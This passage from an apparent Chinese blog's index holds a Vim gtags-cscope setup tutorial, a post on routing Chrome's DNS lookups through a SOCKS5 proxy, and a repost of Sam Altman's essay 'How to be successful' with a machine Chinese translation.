&lt;C-R&gt;=expand(&quot;&lt;cfile&gt;&quot;)&lt;CR&gt;&lt;CR&gt;:nmap &lt;C-\\&gt;i :cs find i &lt;C-R&gt;=expand(&quot;&lt;cfile&gt;&quot;)&lt;CR&gt;&lt;CR&gt;:nmap &lt;C-\\&gt;a :cs find a &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt; gtags-cscope.vim 的使用注释里有详细的说明： 12345678910111213141516171819202122232425262728293031323334&quot; Usage&quot; -----&quot; First of all, you must execute gtags(1) at the root of source directory&quot; to make tag files. Assuming that your source directory is '/var/src',&quot; it is neccessary to execute the following commands.&quot;&quot; [Load vim]&quot; $ cd /var/src&quot; $ gtags&quot; $ vim&quot; [Load gtags-cscope]&quot; :GtagsCscope &lt;ENTER&gt; (in vim command line)&quot;&quot; Basic command&quot; -------------&quot; Then you can use cs commands except for the 'd'(2) command.&quot; Profitable commands are assigned to keys like follows:&quot;&quot; explanation command &quot; ----------------------------------------------------------&quot; Find symbol :cs find 0 or s&quot; Find definition :cs find 1 or g&quot; Find functions called by this function (not implemented)&quot; Find reference :cs find 3 or c&quot; Find text string :cs find 4 or t&quot; Find egrep pattern :cs find 6 or e&quot; Find path :cs find 7 or f&quot; Find include file :cs find 8 or i&quot; Find assignments :cs find 9 or a&quot;&quot; You can move tag list using:&quot; Go to the next tag :tn&quot; Go to the previous tag :tp&quot; Pop tag stack :pop 除了不能使用 :cs find d 命令，可以使用其他所有的命令，gtags-cscope.vim 使用快捷键替代了输入命令，常用的快捷键的含义如下： 12345&lt;C-\\&gt;g - 查看光标下符号的定义&lt;C-\\&gt;s - 查看光标下符号&lt;C-\\&gt;c - 查看光标下符号的引用&lt;C-\\&gt;f - 查找光标下的文件&lt;C-\\&gt;i - 查找哪些文件 include 了本文件 &lt;C-\\&gt;g 是同时按下 Ctrl 和 \\ ，接着再按 g ， 其他的同理。 在 .vimrc 中添加下面的配置 1234567891011121314151617if has(&quot;cscope&quot;)&quot; To use the default key/mouse mapping: let GtagsCscope_Auto_Map = 1&quot; To deterring interruption: let GtagsCscope_Keep_Alive = 1 set cscopetag set csprg=/usr/bin/gtags-cscope set csto=1 set nocsverb&quot; Set enviroment values let $GTAGSLABEL='native-pygments' let $GTAGSCONF='/etc/gtags.conf'endif ☆ 4. GUN global 的使用方法切换到源码目录，执行下面的命令将生成 Global 所需要的索引文件。 12find . -type f -name &quot;*.h&quot; -o -name &quot;*.hpp&quot; -o -name &quot;*.hh&quot; -o -name &quot;*.hxx&quot; -o -name &quot;*.c&quot; -o -name &quot;*.cc&quot; -o -name &quot;*.cpp&quot; -o -name &quot;*.cxx&quot; &gt; gtags.filesgtags -f gtags.files 上面的命令执行完毕后，会生成 GPATH、GRTAGS、GTAGS 几个索引文件。 在 vim 中执行 :GtagsCscope &lt;ENTER&gt; 即可加载索引文件，最后就是使用快捷键愉快地浏览源码文件了。 参考链接 https://www.gnu.org/software/global/global.html https://www.gnu.org/software/global/globaldoc_toc.html","link":"/cn/gtags-cscope/"},{"title":"Chrome 浏览器中的远程 DNS 解析","text":"由于伟大的X火长城的存在，在境内进行 DNS 解析请求返回的报文不一定是靠谱的，有必要使用远程的服务器进行DNS 解析来缓解这个问题。根据 Google 的文档如果设置了 socks5 代理，URL 中的 hostname 将由代理服务器解析。 12The --proxy-server=&quot;socks5://myproxy:8080&quot; flag tells Chrome to send all http:// and https:// URL requests through the SOCKS proxy server &quot;myproxy:8080&quot;,using version 5 of the SOCKS protocol. The hostname for these URLs will be resolved by the proxy server, and not locally by Chrome. 但是由于 chrome 浏览器的 DNS prefetching 特性，即使设置了 socks5 代理 DNS prefetching 特性也会使用本地网络进行 DNS 解析。 1234The --proxy-server flag applies to URL loads only. There are other components of Chrome which may issue DNS resolves directly and hence bypass this proxy server. The most notable such component is the &quot;DNS prefetcher&quot;. Hence if DNS prefetching is not disabled in Chrome then you will still see local DNS requests being issued by Chrome despite having specified a SOCKS v5 proxy server. 下面是禁用 DNS prefetching 的方法，新版本的 chrome 已经取消了直接针对 DNS prefetching 设置的选项，有一个预加载网页的选项，需要把这个选项关闭，具体设置方法为： 1设置 -&gt; 隐私设置和安全性 -&gt; Cookie 及其他网站数据 -&gt; 预加载网页，以便实现更快速的浏览和搜索 禁用 DNS prefetching 的方案是脆弱的，Chrome 可能在其他的地方使用 raw dns requsts （ Chrome 发送 DNS 请求报文)， 绕过代理服务器直接使用本地网络进行 DNS 解析。 12Disabling DNS prefetching would solve this problem, however it is a fragile solution since once needs to be aware of all the areas in Chrome which issue raw DNS requests. 所以最终的解决方案是使用 Google 文档中的命令行参数 --host-resolver-rules= ，经过测试可以使用下面的命令行来解决 DNS 远程解析 1google-chrome --proxy-server=&quot;socks5://127.0.0.1:9999&quot; --host-resolver-rules=&quot;MAP * 0.0.0.0, EXClUDE 127.0.0.1&quot; –host-resolver-rules 将阻止Chrome 使用本地网络发起 DNS 请求，具体的方式是将 DNS 请求转向一个不存在的地址，注意需要排除 sock5 代理的地址。 在实际使用过程中发现，如果不指定 –host-resolver-rules 命令行参数，有少量 DNS 请求会使用本地网络，比如 safebrowsing.googleapis.com 参考资料https://www.chromium.org/developers/design-documents/network-stack/socks-proxy/","link":"/cn/dns_via_socks_proxy_in_chrome/"},{"title":"How to be successful","text":"source: https://blog.samaltman.com/how-to-be-successful I’ve observed thousands of founders and thought a lot about what it takes to make a huge amount of money or to create something important. Usually, people start off wanting the former and end up wanting the latter. Here are 13 thoughts about how to achieve such outlier success. Everything here is easier to do once you’ve already reached a baseline degree of success (through privilege or effort) and want to put in the work to turn that into outlier success. [1] But much of it applies to anyone. 1. Compound yourselfCompounding is magic. Look for it everywhere. Exponential curves are the key to wealth generation. A medium-sized business that grows 50% in value every year becomes huge in a very short amount of time. Few businesses in the world have true network effects and extreme scalability. But with technology, more and more will. It’s worth a lot of effort to find them and create them. You also want to be an exponential curve yourself—you should aim for your life to follow an ever-increasing up-and-to-the-right trajectory. It’s important to move towards a career that has a compounding effect—most careers progress fairly linearly. You don’t want to be in a career where people who have been doing it for two years can be as effective as people who have been doing it for twenty—your rate of learning should always be high. As your career progresses, each unit of work you do should generate more and more results. There are many ways to get this leverage, such as capital, technology, brand, network effects, and managing people. It’s useful to focus on adding another zero to whatever you define as your success metric—money, status, impact on the world, or whatever. I am willing to take as much time as needed between projects to find my next thing. But I always want it to be a project that, if successful, will make the rest of my career look like a footnote. Most people get bogged down in linear opportunities. Be willing to let small opportunities go to focus on potential step changes. I think the biggest competitive advantage in business—either for a company or for an individual’s career—is long-term thinking with a broad view of how different systems in the world are going to come together. One of the notable aspects of compound growth is that the furthest out years are the most important. In a world where almost no one takes a truly long-term view, the market richly rewards those who do. Trust the exponential, be patient, and be pleasantly surprised. 2. Have almost too much self-beliefSelf-belief is immensely powerful. The most successful people I know believe in themselves almost to the point of delusion. Cultivate this early. As you get more data points that your judgment is good and you can consistently deliver results, trust yourself more. If you don’t believe in yourself, it’s hard to let yourself have contrarian ideas about the future. But this is where most value gets created. I remember when Elon Musk took me on a tour of the SpaceX factory many years ago. He talked in detail about manufacturing every part of the rocket, but the thing that sticks in memory was the look of absolute certainty on his face when he talked about sending large rockets to Mars. I left thinking “huh, so that’s the benchmark for what conviction looks like.” Managing your own morale—and your team’s morale—is one of the greatest challenges of most endeavors. It’s almost impossible without a lot of self-belief. And unfortunately, the more ambitious you are, the more the world will try to tear you down. Most highly successful people have been really right about the future at least once at a time when people thought they were wrong. If not, they would have faced much more competition. Self-belief must be balanced with self-awareness. I used to hate criticism of any sort and actively avoided it. Now I try to always listen to it with the assumption that it’s true, and then decide if I want to act on it or not. Truth-seeking is hard and often painful, but it is what separates self-belief from self-delusion. This balance also helps you avoid coming across as entitled and out of touch. 3. Learn to think independentlyEntrepreneurship is very difficult to teach because original thinking is very difficult to teach. School is not set up to teach this—in fact, it generally rewards the opposite. So you have to cultivate it on your own. Thinking from first principles and trying to generate new ideas is fun, and finding people to exchange them with is a great way to get better at this. The next step is to find easy, fast ways to test these ideas in the real world. “I will fail many times, and I will be really right once” is the entrepreneurs’ way. You have to give yourself a lot of chances to get lucky. One of the most powerful lessons to learn is that you can figure out what to do in situations that seem to have no solution. The more times you do this, the more you will believe it. Grit comes from learning you can get back up after you get knocked down. 4. Get good at “sales”Self-belief alone is not sufficient—you also have to be able to convince other people of what you believe. All great careers, to some degree, become sales jobs. You have to evangelize your plans to customers, prospective employees, the press, investors, etc. This requires an inspiring vision, strong communication skills, some degree of charisma, and evidence of execution ability. Getting good at communication—particularly written communication—is an investment worth making. My best advice for communicating clearly is to first make sure your thinking is clear and then use plain, concise language. The best way to be good at sales is to genuinely believe in what you’re selling. Selling what you truly believe in feels great, and trying to sell snake oil feels awful. Getting good at sales is like improving at any other skill—anyone can get better at it with deliberate practice. But for some reason, perhaps because it feels distasteful, many people treat it as something unlearnable. My other big sales tip is to show up in person whenever it’s important. When I was first starting out, I was always willing to get on a plane. It was frequently unnecessary, but three times it led to career-making turning points for me that otherwise would have gone the other way. 5. Make it easy to take risksMost people overestimate risk and underestimate reward. Taking risks is important because it’s impossible to be right all the time—you have to try many things and adapt quickly as you learn more. It’s often easier to take risks early in your career; you don’t have much to lose, and you potentially have a lot to gain. Once you’ve gotten yourself to a point where you have your basic obligations covered you should try to make it easy to take risks. Look for small bets you can make where you lose 1x if you’re wrong but make 100x if it works. Then make a bigger bet in that direction. Don’t save up for too long, though. At YC, we’ve often noticed a problem with founders that have spent a lot of time working at Google or Facebook. When people get used to a comfortable life, a predictable job, and a reputation of succeeding at whatever they do, it gets very hard to leave that behind (and people have an incredible ability to always match their lifestyle to next year’s salary). Even if they do leave, the temptation to return is great. It’s easy—and human nature—to prioritize short-term gain and convenience over long-term fulfillment. But when you aren’t on the treadmill, you can follow your hunches and spend time on things that might turn out to be really interesting. Keeping your life cheap and flexible for as long as you can is a powerful way to do this, but obviously comes with tradeoffs. 6. FocusFocus is a force multiplier on work. Almost everyone I’ve ever met would be well-served by spending more time thinking about what to focus on. It is much more important to work on the right thing than it is to work many hours. Most people waste most of their time on stuff that doesn’t matter. Once you have figured out what to do, be unstoppable about getting your small handful of priorities accomplished quickly. I have yet to meet a slow-moving person who is very successful. 7. Work hardYou can get to about the 90th percentile in your field by working either smart or hard, which is still a great accomplishment. But getting to the 99th percentile requires both—you will be competing with other very talented people who will have great ideas and be willing to work a lot. Extreme people get extreme results. Working a lot comes with huge life trade-offs, and it’s perfectly rational to decide not to do it. But it has a lot of advantages. As in most cases, momentum compounds, and success begets success. And it’s often really fun. One of the great joys in life is finding your purpose, excelling at it, and discovering that your impact matters to something larger than yourself. A YC founder recently expressed great surprise about how much happier and more fulfilled he was after leaving his job at a big company and working towards his maximum possible impact. Working hard at that should be celebrated. It’s not entirely clear to me why working hard has become a Bad Thing in certain parts of the US, but this is certainly not the case in other parts of the world—the amount of energy and drive exhibited by entrepreneurs outside of the US is quickly becoming the new benchmark. You have to figure out how to work hard without burning out. People find their own strategies for this, but one that almost always works is to find work you like doing with people you enjoy spending a lot of time with. I think people who pretend you can be super successful professionally without working most of the time (for some period of your life) are doing a disservice. In fact, work stamina seems to be one of the biggest predictors of long-term success. One more thought about working hard: do it at the beginning of your career. Hard work compounds like interest, and the earlier you do it, the more time you have for the benefits to pay off. It’s also easier to work hard when you have fewer other responsibilities, which is frequently but not always the case when you’re young. 8. Be boldI believe that it’s easier to do a hard startup than an easy startup. People want to be part of something exciting and feel that their work matters. If you are making progress on an important problem, you will have a constant tailwind of people wanting to help you. Let yourself grow more ambitious, and don’t be afraid to work on what you really want to work on. If everyone else is starting meme companies, and you want to start a gene-editing company, then do that and don’t second guess it. Follow your curiosity. Things that seem exciting to you will often seem exciting to other people too. 9. Be willfulA big secret is that you can bend the world to your will a surprising percentage of the time—most people don’t even try, and just accept that things are the way that they are. People have an enormous capacity to make things happen. A combination of self-doubt, giving up too early, and not pushing hard enough prevents most people from ever reaching anywhere near their potential. Ask for what you want. You usually won’t get it, and often the rejection will be painful. But when this works, it works surprisingly well. Almost always, the people who say “I am going to keep going until this works, and no matter what the challenges are I’m going to figure them out”, and mean it, go on to succeed. They are persistent long enough to give themselves a chance for luck to go their way. Airbnb is my benchmark for this. There are so many stories they tell that I wouldn’t recommend trying to reproduce (keeping maxed-out credit cards in those nine-slot three-ring binder pages kids use for baseball cards, eating dollar store cereal for every meal, battle after battle with powerful entrenched interest, and on and on) but they managed to survive long enough for luck to go their way. To be willful, you have to be optimistic—hopefully this is a personality trait that can be improved with practice. I have never met a very successful pessimistic person. 10. Be hard to compete withMost people understand that companies are more valuable if they are difficult to compete with. This is important, and obviously true. But this holds true for you as an individual as well. If what you do can be done by someone else, it eventually will be, and for less money. The best way to become difficult to compete with is to build up leverage. For example, you can do it with personal relationships, by building a strong personal brand, or by getting good at the intersection of multiple different fields. There are many other strategies, but you have to figure out some way to do it. Most people do whatever most people they hang out with do. This mimetic behavior is usually a mistake—if you’re doing the same thing everyone else is doing, you will not be hard to compete with. 11. Build a networkGreat work requires teams. Developing a network of talented people to work with—sometimes closely, sometimes loosely—is an essential part of a great career. The size of the network of really talented people you know often becomes the limiter for what you can accomplish. An effective way to build a network is to help people as much as you can. Doing this, over a long period of time, is what lead to most of my best career opportunities and three of my four best investments. I’m continually surprised how often something good happens to me because of something I did to help a founder ten years ago. One of the best ways to build a network is to develop a reputation for really taking care of the people who work with you. Be overly generous with sharing the upside; it will come back to you 10x. Also, learn how to evaluate what people are great at, and put them in those roles. (This is the most important thing I have learned about management, and I haven’t read much about it.) You want to have a reputation for pushing people hard enough that they accomplish more than they thought they could, but not so hard they burn out. Everyone is better at some things than others. Define yourself by your strengths, not your weaknesses. Acknowledge your weaknesses and figure out how to work around them, but don’t let them stop you from doing what you want to do. “I can’t do X because I’m not good at Y” is something I hear from entrepreneurs surprisingly often, and almost always reflects a lack of creativity. The best way to make up for your weaknesses is to hire complementary team members instead of just hiring people who are good at the same things you are. A particularly valuable part of building a network is to get good at discovering undiscovered talent. Quickly spotting intelligence, drive, and creativity gets much easier with practice. The easiest way to learn is just to meet a lot of people, and keep track of who goes on to impress you and who doesn’t. Remember that you are mostly looking for rate of improvement, and don’t overvalue experience or current accomplishment. I try to always ask myself when I meet someone new “is this person a force of nature?” It’s a pretty good heuristic for finding people who are likely to accomplish great things. A special case of developing a network is finding someone eminent to take a bet on you, ideally early in your career. The best way to do this, no surprise, is to go out of your way to be helpful. (And remember that you have to pay this forward at some point later!) Finally, remember to spend your time with positive people who support your ambitions. 12. You get rich by owning thingsThe biggest economic misunderstanding of my childhood was that people got rich from high salaries. Though there are some exceptions—entertainers for example —almost no one in the history of the Forbes list has gotten there with a salary. You get truly rich by owning things that increase rapidly in value. This can be a piece of a business, real estate, natural resource, intellectual property, or other similar things. But somehow or other, you need to own equity in something, instead of just selling your time. Time only scales linearly. The best way to make things that increase rapidly in value is by making things people want at scale. 13. Be internally drivenMost people are primarily externally driven; they do what they do because they want to impress other people. This is bad for many reasons, but here are two important ones. First, you will work on consensus ideas and on consensus career tracks. You will care a lot—much more than you realize—if other people think you’re doing the right thing. This will probably prevent you from doing truly interesting work, and even if you do, someone else would have done it anyway. Second, you will usually get risk calculations wrong. You’ll be very focused on keeping up with other people and not falling behind in competitive games, even in the short term. Smart people seem to be especially at risk of such externally-driven behavior. Being aware of it helps, but only a little—you will likely have to work super-hard to not fall in the mimetic trap. The most successful people I know are primarily internally driven; they do what they do to impress themselves and because they feel compelled to make something happen in the world. After you’ve made enough money to buy whatever you want and gotten enough social status that it stops being fun to get more, this is the only force I know of that will continue to drive you to higher levels of performance. This is why the question of a person’s motivation is so important. It’s the first thing I try to understand about someone. The right motivations are hard to define a set of rules for, but you know it when you see it. Jessica Livingston and Paul Graham are my benchmarks for this. YC was widely mocked for the first few years, and almost no one thought it would be a big success when they first started. But they thought it would be great for the world if it worked, and they love helping people, and they were convinced their new model was better than the existing model. Eventually, you will define your success by performing excellent work in areas that are important to you. The sooner you can start off in that direction, the further you will be able to go. It is hard to be wildly successful at anything you aren’t obsessed with. [1] A comment response I wrote on HN:One of the biggest reasons I’m excited about basic income is the amount of human potential it will unleash by freeing more people to take risks.Until then, if you aren’t born lucky, you have to claw your way up for awhile before you can take big swings. If you are born in extreme poverty, then this is super difficult :( It is obviously an incredible shame and waste that opportunity is so unevenly distributed. But I’ve witnessed enough people be born with the deck stacked badly against them and go on to incredible success to know it’s possible. I am deeply aware of the fact that I personally would not be where I am if I weren’t born incredibly lucky. Thanks to Brian Armstrong, Greg Brockman, Dalton Caldwell, Diane von Furstenberg, Maddie Hall, Drew Houston, Vinod Khosla, Jessica Livingston, Jon Levy, Luke Miles (6 drafts!), Michael Moritz, Ali Rowghani, Michael Seibel, Peter Thiel, Tracy Young and Shivon Zilis for reviewing drafts of this, and thanks especially to Lachy Groom for help writing it. 以下是 DeepL 的翻译标题： 如何获得成功 我观察了数以千计的创始人，并思考了很多关于赚取巨额金钱或创造重要事物所需的东西。通常情况下，人们一开始希望得到前者，最后却希望得到后者。 这里有13个关于如何实现这种超常成功的想法。一旦你已经达到了成功的基本程度（通过特权或努力），并想投入工作将其转化为离群的成功，这里的一切就更容易做到。[1] 但其中大部分内容适用于任何人。 1. 复利自己复利是一种魔法。到处寻找它。指数曲线是创造财富的关键。 一个中等规模的企业，如果每年的价值增长50%，就会在很短的时间内变得巨大。世界上很少有企业拥有真正的网络效应和极端的可扩展性。但随着技术的发展，会有越来越多的企业。 值得花大力气去寻找它们，创造它们。 你也想让自己成为一条指数曲线–你的目标应该是让你的生活遵循一条不断增加的向上和向右的轨迹。重要的是，要朝着具有复合效应的职业发展–大多数职业的发展是相当线性的。 你不希望在一个职业中，做了两年的人可以和做了二十年的人一样有效–你的学习率应该一直很高。随着你事业的发展，你所做的每一个单位的工作应该产生越来越多的结果。有很多方法可以获得这种杠杆作用，如资本、技术、品牌、网络效应和管理人。 不管你把什么定义为你的成功指标–金钱、地位、对世界的影响，或者其他什么，专注于再加一个零是很有用的。我愿意在项目之间花尽可能多的时间来寻找我的下一件事。但我总是希望它是一个项目，如果成功，将使我职业生涯的其余部分看起来像一个脚注。 大多数人在线性机会中陷入困境。要愿意让小的机会消失，以专注于潜在的步骤变化。 我认为商业上最大的竞争优势–无论是对公司还是对个人的职业生涯–是长期的思考，对世界上不同的系统如何结合起来有一个广泛的看法。复合增长的一个显著方面是，最远的年份是最重要的。在这个世界上，几乎没有人采取真正的长期观点，市场对那些这样做的人给予了丰厚的回报。 相信指数，要有耐心，并获得惊喜。 2. 拥有几乎太多的自信心自信的力量是巨大的。我认识的最成功的人对自己的信念几乎达到了妄想的程度。 尽早培养这种信念。当你得到更多的数据，证明你的判断力是好的，而且你能持续提供结果时，就更加相信自己。 如果你不相信自己，就很难让自己对未来有逆向的想法。但这是最能创造价值的地方。 我记得很多年前，埃隆-马斯克带我参观了SpaceX的工厂。他详细谈论了火箭的每一个部分的制造，但让我记忆犹新的是，当他谈到将大型火箭送往火星时，他脸上露出了绝对肯定的表情。我离开时想：”啊，原来这就是信念的基准。” 管理你自己的士气–以及你的团队的士气–是大多数工作的最大挑战之一。如果没有足够的自信心，这几乎是不可能的。不幸的是，你越有雄心壮志，世界就越想把你打倒。 大多数高度成功的人至少有一次在人们认为他们错了的时候，对未来的看法是真正正确的。如果不是这样，他们会面临更多的竞争。 自信必须与自我意识相平衡。我曾经讨厌任何形式的批评，并主动回避它。现在，我试着总是在假设它是真实的情况下听取它，然后决定是否要采取行动。寻求真理是困难的，而且常常是痛苦的，但它是区分自信心和自欺欺人的原因。 这种平衡也有助于你避免表现出有权和不合群的样子。 3. 学会独立思考创业精神是很难教的，因为原创性思维是很难教的。学校的设置不是为了教这个–事实上，它通常奖励相反的东西。所以你必须自己培养它。 从第一原则出发思考并试图产生新的想法是很有趣的，而找到与之交流的人是在这方面做得更好的一个好方法。下一步是找到简单、快速的方法，在现实世界中测试这些想法。 “我会失败很多次，而我真的会对一次 “是企业家的方式。你必须给自己很多机会来获得幸运。 要学习的最有力的课程之一是，你可以在似乎没有解决方案的情况下想出办法。你这样做的次数越多，你就会越相信它。勇气来自于学习你可以在被击倒后重新站起来。 4. 善于 “销售”光有自信心是不够的，你还必须能够说服其他人相信你的想法。 所有伟大的事业，在某种程度上，都成为销售工作。你必须向客户、未来的员工、媒体、投资者等宣扬你的计划。这需要一个鼓舞人心的愿景，强大的沟通技巧，一定程度的魅力，以及执行能力的证明。 善于沟通，特别是书面沟通，是一项值得投资的工作。我对清晰沟通的最佳建议是，首先确保你的思路清晰，然后使用平实、简明的语言。 做好销售的最好方法是真正相信你所销售的东西。销售你真正相信的东西感觉很好，而试图销售蛇油的感觉很糟糕。 擅长销售就像提高其他技能一样，任何人都可以通过刻意练习而变得更好。但出于某种原因，也许是因为它让人感到厌恶，许多人把它当作无法学习的东西。 我的另一个重要的销售建议是在重要的时候亲自出面。当我刚开始工作时，我总是愿意坐飞机。这经常是不必要的，但有三次它导致了我的职业生涯的转折点，否则就会走到另一个方向。 5.让人容易承担风险大多数人高估了风险，低估了回报。承担风险是很重要的，因为你不可能一直都是正确的，你必须尝试很多东西，并在你学到更多东西时迅速适应。 在你职业生涯的早期，往往更容易承担风险；你没有什么损失，而你有可能获得很多。一旦你让自己的基本义务得到保障，你就应该试着让自己容易承担风险。寻找你可以做的小赌注，如果你错了，你会损失1倍，但如果成功了，会赚100倍。然后朝着这个方向做一个更大的赌注。 不过，不要积攒太久。在YC，我们经常注意到那些在谷歌或Facebook工作了很长时间的创始人的一个问题。当人们习惯了舒适的生活，可预测的工作，以及无论做什么都能成功的声誉时，就很难将其抛在脑后（人们有一种难以置信的能力，总是将自己的生活方式与明年的工资相匹配）。即使他们真的离开了，返回的诱惑也很大。将短期利益和便利性置于长期成就之上是很容易的，也是人类的天性。 但是，当你不在跑步机上时，你可以跟随你的直觉，把时间花在那些可能变成真正有趣的事情上。在尽可能长的时间内保持你的生活廉价和灵活是一个强大的方法，但显然是有代价的。 6. 专注专注是工作中的一种力量倍增器。 我见过的几乎每个人都会花更多的时间来思考该专注于什么。在正确的事情上工作比在许多时间上工作要重要得多。大多数人把大部分时间浪费在不重要的事情上。 一旦你想清楚了要做什么，就要势不可挡地迅速完成你那一小撮优先事项。我还没有见过一个行动缓慢的人非常成功。 7. 努力工作你可以通过聪明或努力工作达到你所在领域的第90个百分点，这仍然是一个伟大的成就。但是，要想达到第99百分位数，则需要两者兼备–你将与其他非常有才华的人竞争，他们会有很好的想法，并愿意付出很多努力。 极端的人得到极端的结果。大量工作伴随着巨大的生活权衡，决定不这样做是完全理性的。但它也有很多优点。就像在大多数情况下一样，势头会越来越大，成功会带来成功。 而且它往往非常有趣。生活中最大的乐趣之一是找到你的目的，在这方面表现出色，并发现你的影响比你自己更重要。一位YC的创始人最近表示非常惊讶，在离开大公司的工作后，他变得更加快乐和充实，并为自己的最大影响力而努力。在这一点上努力工作应该得到赞许。 我并不完全清楚为什么在美国的某些地方，努力工作已经成为一件坏事，但在世界其他地方肯定不是这样的–美国以外的企业家所表现出来的能量和动力正迅速成为新的基准。 你必须弄清楚如何努力工作而不至于筋疲力尽。人们为此找到自己的策略，但有一个几乎总是有效的策略是找到你喜欢的工作，与你喜欢花很多时间的人一起工作。 我认为那些假装你可以在职业上取得巨大成功而不需要大部分时间（在你生命中的某个时期）工作的人是在做一件坏事。事实上，工作耐力似乎是长期成功的最大预测因素之一。 关于努力工作还有一个想法：在你的职业生涯开始时就努力工作。艰苦的工作就像利息一样复利，你越早做，你就有越多的时间来获得回报。当你有较少的其他责任时，也更容易努力工作，这在你年轻的时候经常发生，但并不总是这样。 8. 大胆一点我相信，做一个艰难的创业公司比做一个容易的创业公司更容易。人们希望成为令人兴奋的事情的一部分，并感到他们的工作很重要。 如果你在一个重要的问题上取得了进展，你将会有一个持续的尾巴，人们想要帮助你。让自己变得更有野心，不要害怕从事你真正想做的工作。 如果其他人都在创办备忘录公司，而你想创办一家基因编辑公司，那就去做，不要猜测。 遵循你的好奇心。对你来说似乎很兴奋的事情，往往也会让其他人感到兴奋。 9.要有意志力一个很大的秘密是，你可以在令人惊讶的时间内使世界屈服于你的意志，大多数人甚至没有尝试，而只是接受事情是他们的方式。 人们有一种巨大的能力来使事情发生。自我怀疑、过早放弃和不够努力等因素结合在一起，使大多数人无法达到接近其潜力的程度。 要求得到你想要的东西。你通常不会得到它，而且往往拒绝会很痛苦。但当这一方法奏效时，它的效果出奇地好。 几乎总是这样，那些说 “我要一直走下去，直到成功为止，不管有什么挑战，我都要把它们解决掉 “的人，并且是认真的，会继续取得成功。他们坚持了足够长的时间，给自己一个机会，让幸运降临到他们身上。 Airbnb是我在这方面的基准。他们有很多故事，我不建议尝试复制（把刷爆的信用卡放在孩子们用来装棒球卡的九槽三环夹子里，每顿都吃一元店的麦片，与强大的利益集团进行一场又一场的斗争，等等），但他们设法生存了足够长的时间，让运气顺着他们。 要想成为有意志力的人，你必须要乐观–希望这是一个可以通过实践来改善的人格特质。我从未见过一个非常成功的悲观主义者。 10. 很难与之竞争大多数人都明白，如果公司难以与之竞争，就更有价值。这很重要，显然也是事实。 但这对作为个人的你也是如此。如果你所做的事情可以由别人来做，那么最终就会由别人来做，而且花的钱更少。 变得难以与之竞争的最好方法是建立杠杆。例如，你可以通过个人关系，通过建立一个强大的个人品牌，或者通过在多个不同领域的交叉点上获得优势来做到这一点。还有许多其他策略，但你必须想出一些办法来做。 大多数人做他们所交往的大多数人做的事。这种模仿行为通常是个错误–如果你做的是别人都在做的事情，你将不难与之竞争。 11. 建立一个网络伟大的工作需要团队。发展一个由有才华的人组成的工作网络–有时是紧密的，有时是松散的–是伟大事业的一个重要组成部分。你所认识的真正有才华的人的网络的大小往往成为你能取得成就的限制因素。 建立网络的一个有效方法是尽可能地帮助别人。在很长一段时间内，这样做是导致我最好的职业机会和我四个最好的投资中的三个的原因。我不断感到惊讶，因为我十年前帮助一位创始人的事情，经常有好事发生在我身上。 建立网络的最好方法之一是建立一个真正照顾到与你合作的人的声誉。要过分慷慨地分享好处；这将会给你带来10倍的回报。另外，学会如何评估人们的长处，并让他们担任这些职务。(这是我在管理方面学到的最重要的东西，而我并没有读过很多这方面的书）。你要有一个口碑，那就是把人逼得够狠，使他们的成就超过他们的想象，但又不至于让他们倦怠。 每个人在某些方面都比其他人强。用你的优势来定义你自己，而不是你的弱点。承认你的弱点并想办法解决它们，但不要让它们阻止你做你想做的事。”我不能做X，因为我不擅长Y”，这是我经常从企业家那里听到的，而且几乎总是反映出缺乏创造力。弥补你的弱点的最好方法是雇用互补的团队成员，而不是仅仅雇用那些擅长你所做的同样事情的人。 建立网络的一个特别有价值的部分是要善于发现未被发现的人才。通过练习，快速发现智慧、动力和创造力变得更加容易。最简单的学习方法就是认识很多人，并跟踪谁会给你留下深刻印象，谁不会。记住，你主要是在寻找改进的速度，不要高估经验或当前的成就。 当我遇到新的人时，我试着总是问自己：”这个人是一个自然的力量吗？” 这是一个相当好的启发式方法，可以找到那些有可能完成伟大事业的人。 发展网络的一个特殊情况是找到知名人士为你下注，最好是在你职业生涯的早期。要做到这一点，毫不奇怪，最好的办法是不遗余力地提供帮助。(请记住，你必须在以后的某个时间点上把这些钱交出来！）。 最后，记得把你的时间花在支持你雄心壮志的积极人士身上。 12. 你通过拥有东西而致富我童年时最大的经济误区是人们通过高薪致富。虽然有一些例外–例如娱乐界人士–但在福布斯榜单的历史上，几乎没有人是靠工资获得的。 你通过拥有快速增值的东西来获得真正的财富。 这可以是一个企业的一部分，房地产，自然资源，知识产权，或其他类似的东西。但无论如何，你需要拥有某些东西的股权，而不是仅仅出售你的时间。时间只是线性扩展的。 制造快速增值的东西的最好方法是大规模制造人们想要的东西。 13. 要有内部驱动力大多数人主要是受外部驱动；他们做他们所做的事是因为他们想给其他人留下深刻印象。这有很多不好的原因，但这里有两个重要的原因。 首先，你将在协商一致的想法和协商一致的职业轨道上工作。 你会非常关心–比你意识到的要多得多–其他人是否认为你在做正确的事情。这可能会阻止你做真正有趣的工作，即使你做了，别人也会做。 第二，你通常会把风险计算弄错。你会非常专注于跟上别人的步伐，在竞争性游戏中不掉队，即使是在短期内。 聪明人似乎特别容易出现这种外在驱动的行为。意识到这一点有帮助，但只是一点点–你很可能要付出超强的努力才不会落入模仿的陷阱。 我所知道的最成功的人主要是由内部驱动的；他们所做的事情是为了给自己留下深刻印象，也是因为他们感到有必要在这个世界上有所作为。在你赚够了钱，可以买到你想要的任何东西，得到了足够的社会地位，不再以获得更多的东西为乐趣之后，这是我所知道的唯一的力量，会继续推动你达到更高的表现水平。 这就是为什么一个人的动机问题是如此重要。这是我试图了解一个人的第一件事。正确的动机很难定义一套规则，但当你看到它时，你就会知道它。 杰西卡-利文斯顿和保罗-格雷厄姆是我这方面的标杆。YC在最初几年被广泛嘲笑，在他们刚开始的时候几乎没有人认为它会大获成功。但他们认为，如果它能成功，对世界来说是件好事，而且他们喜欢帮助人，他们坚信他们的新模式比现有模式更好。 最终，你将通过在对你很重要的领域进行出色的工作来定义你的成功。你越早朝这个方向起步，你就能走得越远。你很难在你不痴迷的事情上取得巨大的成功。 [1] 我在HN上写的一个评论回应。我对基本收入感到兴奋的最大原因之一是，它将通过释放更多的人去冒险而释放出大量的人类潜力。在此之前，如果你不是天生的幸运儿，你必须在大摇大摆之前努力奋斗一阵子。如果你出生在极端贫困地区，那么这就超级困难了。 机会分配如此不均，显然是一种难以置信的耻辱和浪费。但是，我已经目睹了足够多的人出生在对他们非常不利的环境中，并取得了令人难以置信的成功，所以我知道这是可能的。 我深深地意识到，如果我不是生来就非常幸运，我个人就不会有现在的成就。 